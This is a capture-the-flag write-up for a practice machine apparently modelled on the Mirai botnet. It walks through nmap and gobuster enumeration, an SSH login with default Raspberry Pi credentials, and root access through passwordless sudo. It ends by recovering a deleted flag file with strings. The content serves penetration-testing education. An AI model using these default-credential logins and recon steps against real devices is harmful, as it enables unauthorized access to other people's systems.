# Solution

The name of the machine may give us an idea of what to expect from the box. 
Mirai is a malware which scans the internet for open telnet ports and tries to log in with default credentials. It managed to create a huge botnet in the past.  
We can expect that exploiting default credentials in some services, we can gain access to the box.

Start with the usual nmap to enumerate
```
nmap -sC -sV -oN nmap-initial 10.10.10.48
```

We see SSH and port 80 open. Browsing the website we get a blank page.  

We run gobuster
```
gobuster dir -u http://10.10.10.48 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 25 -o gobuster.out
```

One of the exposed directories is /admin. By browsing it, we access the  pihole admin interface. We thus know that the machine is a raspberry pi. We can try to log in through SSH using the default credentials (user:pi , password:raspberry).  
It works and we have a shell. Once we are inside we check whether the user pi can use sudo on any commands.

```
>sudo -l

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```
We can run all the commands and no need to provide a password. Therefore:
```
>pi@raspberrypi:~/Desktop $ sudo -i
root@raspberrypi:~# ls
root.txt
root@raspberrypi:~# cat root.txt 
I lost my original root.txt! I think I may have a backup on my USB stick...
```

The root.txt file is not here. Mmmmm, he mention something about the USB stick.  
Usually the USB sticks are mounted under the /media directory. If we move to that directory we find a directory and a file.  
```
root@raspberrypi:/media/usbstick# cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

Next step is to recover the file deleted by James. We can see if the file is still in the USB memory. 
First we see what is the device fileof the USB stick:
```
>root@raspberrypi:/media/usbstick# df
Filesystem     1K-blocks    Used Available Use% Mounted on
aufs             8856504 2838380   5545192  34% /
tmpfs             102396    4868     97528   5% /run
/dev/sda1        1354528 1354528         0 100% /lib/live/mount/persistence/sda1
/dev/loop0       1267456 1267456         0 100% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs             255988       0    255988   0% /lib/live/mount/overlay
/dev/sda2        8856504 2838380   5545192  34% /lib/live/mount/persistence/sda2
devtmpfs           10240       0     10240   0% /dev
tmpfs             255988       8    255980   1% /dev/shm
tmpfs               5120       4      5116   1% /run/lock
tmpfs             255988       0    255988   0% /sys/fs/cgroup
tmpfs             255988       8    255980   1% /tmp
/dev/sdb            8887      93      8078   2% /media/usbstick
tmpfs              51200       0     51200   0% /run/user/999
tmpfs              51200       0     51200   0% /run/user/1000
```
It is /dev/sdb. We can now print the readable characters in the device file and hope for a flag :)
```
strings /dev/sdb
```

The content of the deleted file has not been overwritten and it's still in the USB memory.  
Here is the flag :)
